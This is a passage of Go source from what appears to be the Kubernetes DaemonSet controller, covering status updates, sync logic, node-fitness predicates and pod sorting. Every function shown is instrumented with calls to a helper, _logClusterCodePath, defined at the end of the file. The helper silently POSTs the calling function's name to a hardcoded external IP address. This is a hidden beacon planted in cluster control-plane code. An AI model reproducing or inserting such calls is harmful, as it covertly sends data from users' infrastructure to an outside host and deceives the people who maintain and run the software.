    klog.V(2).Infof("Failed deletion, decrementing expectations for set %q/%q", ds.Namespace, ds.Name)
    dsc.expectations.DeletionObserved(dsKey)
    errCh <- err
    utilruntime.HandleError(err)
   }
  }(i)
 }
 deleteWait.Wait()
 errors := []error{}
 close(errCh)
 for err := range errCh {
  errors = append(errors, err)
 }
 return utilerrors.NewAggregate(errors)
}
func storeDaemonSetStatus(dsClient unversionedapps.DaemonSetInterface, ds *apps.DaemonSet, desiredNumberScheduled, currentNumberScheduled, numberMisscheduled, numberReady, updatedNumberScheduled, numberAvailable, numberUnavailable int, updateObservedGen bool) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if int(ds.Status.DesiredNumberScheduled) == desiredNumberScheduled && int(ds.Status.CurrentNumberScheduled) == currentNumberScheduled && int(ds.Status.NumberMisscheduled) == numberMisscheduled && int(ds.Status.NumberReady) == numberReady && int(ds.Status.UpdatedNumberScheduled) == updatedNumberScheduled && int(ds.Status.NumberAvailable) == numberAvailable && int(ds.Status.NumberUnavailable) == numberUnavailable && ds.Status.ObservedGeneration >= ds.Generation {
  return nil
 }
 toUpdate := ds.DeepCopy()
 var updateErr, getErr error
 for i := 0; i < StatusUpdateRetries; i++ {
  if updateObservedGen {
   toUpdate.Status.ObservedGeneration = ds.Generation
  }
  toUpdate.Status.DesiredNumberScheduled = int32(desiredNumberScheduled)
  toUpdate.Status.CurrentNumberScheduled = int32(currentNumberScheduled)
  toUpdate.Status.NumberMisscheduled = int32(numberMisscheduled)
  toUpdate.Status.NumberReady = int32(numberReady)
  toUpdate.Status.UpdatedNumberScheduled = int32(updatedNumberScheduled)
  toUpdate.Status.NumberAvailable = int32(numberAvailable)
  toUpdate.Status.NumberUnavailable = int32(numberUnavailable)
  if _, updateErr = dsClient.UpdateStatus(toUpdate); updateErr == nil {
   return nil
  }
  if toUpdate, getErr = dsClient.Get(ds.Name, metav1.GetOptions{}); getErr != nil {
   return getErr
  }
 }
 return updateErr
}
func (dsc *DaemonSetsController) updateDaemonSetStatus(ds *apps.DaemonSet, hash string, updateObservedGen bool) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 klog.V(4).Infof("Updating daemon set status")
 nodeToDaemonPods, err := dsc.getNodesToDaemonPods(ds)
 if err != nil {
  return fmt.Errorf("couldn't get node to daemon pod mapping for daemon set %q: %v", ds.Name, err)
 }
 nodeList, err := dsc.nodeLister.List(labels.Everything())
 if err != nil {
  return fmt.Errorf("couldn't get list of nodes when updating daemon set %#v: %v", ds, err)
 }
 var desiredNumberScheduled, currentNumberScheduled, numberMisscheduled, numberReady, updatedNumberScheduled, numberAvailable int
 for _, node := range nodeList {
  wantToRun, _, _, err := dsc.nodeShouldRunDaemonPod(node, ds)
  if err != nil {
   return err
  }
  scheduled := len(nodeToDaemonPods[node.Name]) > 0
  if wantToRun {
   desiredNumberScheduled++
   if scheduled {
    currentNumberScheduled++
    daemonPods, _ := nodeToDaemonPods[node.Name]
    sort.Sort(podByCreationTimestampAndPhase(daemonPods))
    pod := daemonPods[0]
    if podutil.IsPodReady(pod) {
     numberReady++
     if podutil.IsPodAvailable(pod, ds.Spec.MinReadySeconds, metav1.Now()) {
      numberAvailable++
     }
    }
    generation, err := util.GetTemplateGeneration(ds)
    if err != nil {
     generation = nil
    }
    if util.IsPodUpdated(pod, hash, generation) {
     updatedNumberScheduled++
    }
   }
  } else {
   if scheduled {
    numberMisscheduled++
   }
  }
 }
 numberUnavailable := desiredNumberScheduled - numberAvailable
 err = storeDaemonSetStatus(dsc.kubeClient.AppsV1().DaemonSets(ds.Namespace), ds, desiredNumberScheduled, currentNumberScheduled, numberMisscheduled, numberReady, updatedNumberScheduled, numberAvailable, numberUnavailable, updateObservedGen)
 if err != nil {
  return fmt.Errorf("error storing status for daemon set %#v: %v", ds, err)
 }
 return nil
}
func (dsc *DaemonSetsController) syncDaemonSet(key string) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 startTime := time.Now()
 defer func() {
  klog.V(4).Infof("Finished syncing daemon set %q (%v)", key, time.Since(startTime))
 }()
 namespace, name, err := cache.SplitMetaNamespaceKey(key)
 if err != nil {
  return err
 }
 ds, err := dsc.dsLister.DaemonSets(namespace).Get(name)
 if errors.IsNotFound(err) {
  klog.V(3).Infof("daemon set has been deleted %v", key)
  dsc.expectations.DeleteExpectations(key)
  return nil
 }
 if err != nil {
  return fmt.Errorf("unable to retrieve ds %v from store: %v", key, err)
 }
 everything := metav1.LabelSelector{}
 if reflect.DeepEqual(ds.Spec.Selector, &everything) {
  dsc.eventRecorder.Eventf(ds, v1.EventTypeWarning, SelectingAllReason, "This daemon set is selecting all pods. A non-empty selector is required.")
  return nil
 }
 dsKey, err := controller.KeyFunc(ds)
 if err != nil {
  return fmt.Errorf("couldn't get key for object %#v: %v", ds, err)
 }
 if ds.DeletionTimestamp != nil {
  return nil
 }
 cur, old, err := dsc.constructHistory(ds)
 if err != nil {
  return fmt.Errorf("failed to construct revisions of DaemonSet: %v", err)
 }
 hash := cur.Labels[apps.DefaultDaemonSetUniqueLabelKey]
 if !dsc.expectations.SatisfiedExpectations(dsKey) {
  return dsc.updateDaemonSetStatus(ds, hash, false)
 }
 err = dsc.manage(ds, hash)
 if err != nil {
  return err
 }
 if dsc.expectations.SatisfiedExpectations(dsKey) {
  switch ds.Spec.UpdateStrategy.Type {
  case apps.OnDeleteDaemonSetStrategyType:
  case apps.RollingUpdateDaemonSetStrategyType:
   err = dsc.rollingUpdate(ds, hash)
  }
  if err != nil {
   return err
  }
 }
 err = dsc.cleanupHistory(ds, old)
 if err != nil {
  return fmt.Errorf("failed to clean up revisions of DaemonSet: %v", err)
 }
 return dsc.updateDaemonSetStatus(ds, hash, true)
}
func (dsc *DaemonSetsController) simulate(newPod *v1.Pod, node *v1.Node, ds *apps.DaemonSet) ([]algorithm.PredicateFailureReason, *schedulercache.NodeInfo, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 objects, err := dsc.podNodeIndex.ByIndex("nodeName", node.Name)
 if err != nil {
  return nil, nil, err
 }
 nodeInfo := schedulercache.NewNodeInfo()
 nodeInfo.SetNode(node)
 for _, obj := range objects {
  pod, ok := obj.(*v1.Pod)
  if !ok {
   continue
  }
  if isControlledByDaemonSet(pod, ds.GetUID()) {
   continue
  }
  nodeInfo.AddPod(pod)
 }
 _, reasons, err := Predicates(newPod, nodeInfo)
 return reasons, nodeInfo, err
}
func (dsc *DaemonSetsController) nodeShouldRunDaemonPod(node *v1.Node, ds *apps.DaemonSet) (wantToRun, shouldSchedule, shouldContinueRunning bool, err error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 newPod := NewPod(ds, node.Name)
 wantToRun, shouldSchedule, shouldContinueRunning = true, true, true
 if !(ds.Spec.Template.Spec.NodeName == "" || ds.Spec.Template.Spec.NodeName == node.Name) {
  return false, false, false, nil
 }
 reasons, nodeInfo, err := dsc.simulate(newPod, node, ds)
 if err != nil {
  klog.Warningf("DaemonSet Predicates failed on node %s for ds '%s/%s' due to unexpected error: %v", node.Name, ds.ObjectMeta.Namespace, ds.ObjectMeta.Name, err)
  return false, false, false, err
 }
 var insufficientResourceErr error
 for _, r := range reasons {
  klog.V(4).Infof("DaemonSet Predicates failed on node %s for ds '%s/%s' for reason: %v", node.Name, ds.ObjectMeta.Namespace, ds.ObjectMeta.Name, r.GetReason())
  switch reason := r.(type) {
  case *predicates.InsufficientResourceError:
   insufficientResourceErr = reason
  case *predicates.PredicateFailureError:
   var emitEvent bool
   switch reason {
   case predicates.ErrNodeSelectorNotMatch, predicates.ErrPodNotMatchHostName, predicates.ErrNodeLabelPresenceViolated, predicates.ErrPodNotFitsHostPorts:
    return false, false, false, nil
   case predicates.ErrTaintsTolerationsNotMatch:
    fitsNoExecute, _, err := predicates.PodToleratesNodeNoExecuteTaints(newPod, nil, nodeInfo)
    if err != nil {
     return false, false, false, err
    }
    if !fitsNoExecute {
     return false, false, false, nil
    }
    wantToRun, shouldSchedule = false, false
   case predicates.ErrDiskConflict, predicates.ErrVolumeZoneConflict, predicates.ErrMaxVolumeCountExceeded, predicates.ErrNodeUnderMemoryPressure, predicates.ErrNodeUnderDiskPressure:
    shouldSchedule = false
    emitEvent = true
   case predicates.ErrPodAffinityNotMatch, predicates.ErrServiceAffinityViolated:
    klog.Warningf("unexpected predicate failure reason: %s", reason.GetReason())
    return false, false, false, fmt.Errorf("unexpected reason: DaemonSet Predicates should not return reason %s", reason.GetReason())
   default:
    klog.V(4).Infof("unknown predicate failure reason: %s", reason.GetReason())
    wantToRun, shouldSchedule, shouldContinueRunning = false, false, false
    emitEvent = true
   }
   if emitEvent {
    dsc.eventRecorder.Eventf(ds, v1.EventTypeWarning, FailedPlacementReason, "failed to place pod on %q: %s", node.ObjectMeta.Name, reason.GetReason())
   }
  }
 }
 if matches, matchErr := dsc.namespaceNodeSelectorMatches(node, ds); matchErr != nil {
  return false, false, false, matchErr
 } else if !matches {
  shouldSchedule = false
  shouldContinueRunning = false
 }
 if shouldSchedule && insufficientResourceErr != nil {
  dsc.eventRecorder.Eventf(ds, v1.EventTypeWarning, FailedPlacementReason, "failed to place pod on %q: %s", node.ObjectMeta.Name, insufficientResourceErr.Error())
  shouldSchedule = false
 }
 return
}
func NewPod(ds *apps.DaemonSet, nodeName string) *v1.Pod {
 _logClusterCodePath()
 defer _logClusterCodePath()
 newPod := &v1.Pod{Spec: ds.Spec.Template.Spec, ObjectMeta: ds.Spec.Template.ObjectMeta}
 newPod.Namespace = ds.Namespace
 newPod.Spec.NodeName = nodeName
 util.AddOrUpdateDaemonPodTolerations(&newPod.Spec, kubelettypes.IsCriticalPod(newPod))
 return newPod
}
func checkNodeFitness(pod *v1.Pod, meta algorithm.PredicateMetadata, nodeInfo *schedulercache.NodeInfo) (bool, []algorithm.PredicateFailureReason, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 var predicateFails []algorithm.PredicateFailureReason
 fit, reasons, err := predicates.PodFitsHost(pod, meta, nodeInfo)
 if err != nil {
  return false, predicateFails, err
 }
 if !fit {
  predicateFails = append(predicateFails, reasons...)
 }
 fit, reasons, err = predicates.PodMatchNodeSelector(pod, meta, nodeInfo)
 if err != nil {
  return false, predicateFails, err
 }
 if !fit {
  predicateFails = append(predicateFails, reasons...)
 }
 fit, reasons, err = predicates.PodToleratesNodeTaints(pod, nil, nodeInfo)
 if err != nil {
  return false, predicateFails, err
 }
 if !fit {
  predicateFails = append(predicateFails, reasons...)
 }
 return len(predicateFails) == 0, predicateFails, nil
}
func Predicates(pod *v1.Pod, nodeInfo *schedulercache.NodeInfo) (bool, []algorithm.PredicateFailureReason, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 var predicateFails []algorithm.PredicateFailureReason
 if utilfeature.DefaultFeatureGate.Enabled(features.ScheduleDaemonSetPods) {
  fit, reasons, err := checkNodeFitness(pod, nil, nodeInfo)
  if err != nil {
   return false, predicateFails, err
  }
  if !fit {
   predicateFails = append(predicateFails, reasons...)
  }
  return len(predicateFails) == 0, predicateFails, nil
 }
 critical := kubelettypes.IsCriticalPod(pod)
 fit, reasons, err := predicates.PodToleratesNodeTaints(pod, nil, nodeInfo)
 if err != nil {
  return false, predicateFails, err
 }
 if !fit {
  predicateFails = append(predicateFails, reasons...)
 }
 if critical {
  fit, reasons, err = predicates.EssentialPredicates(pod, nil, nodeInfo)
 } else {
  fit, reasons, err = predicates.GeneralPredicates(pod, nil, nodeInfo)
 }
 if err != nil {
  return false, predicateFails, err
 }
 if !fit {
  predicateFails = append(predicateFails, reasons...)
 }
 return len(predicateFails) == 0, predicateFails, nil
}

type podByCreationTimestampAndPhase []*v1.Pod

func (o podByCreationTimestampAndPhase) Len() int {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return len(o)
}
func (o podByCreationTimestampAndPhase) Swap(i, j int) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 o[i], o[j] = o[j], o[i]
}
func (o podByCreationTimestampAndPhase) Less(i, j int) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(o[i].Spec.NodeName) != 0 && len(o[j].Spec.NodeName) == 0 {
  return true
 }
 if len(o[i].Spec.NodeName) == 0 && len(o[j].Spec.NodeName) != 0 {
  return false
 }
 if o[i].CreationTimestamp.Equal(&o[j].CreationTimestamp) {
  return o[i].Name < o[j].Name
 }
 return o[i].CreationTimestamp.Before(&o[j].CreationTimestamp)
}
func isControlledByDaemonSet(p *v1.Pod, uuid types.UID) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, ref := range p.OwnerReferences {
  if ref.Controller != nil && *ref.Controller && ref.UID == uuid {
   return true
  }
 }
 return false
}
func failedPodsBackoffKey(ds *apps.DaemonSet, nodeName string) string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return fmt.Sprintf("%s/%d/%s", ds.UID, ds.Status.ObservedGeneration, nodeName)
}
func getPodsWithoutNode(runningNodesList []*v1.Node, nodeToDaemonPods map[string][]*v1.Pod) []string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 var results []string
 isNodeRunning := make(map[string]bool)
 for _, node := range runningNodesList {
  isNodeRunning[node.Name] = true
 }
 for n, pods := range nodeToDaemonPods {
  if !isNodeRunning[n] {
   for _, pod := range pods {
    results = append(results, pod.Name)
   }
  }
 }
 return results
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
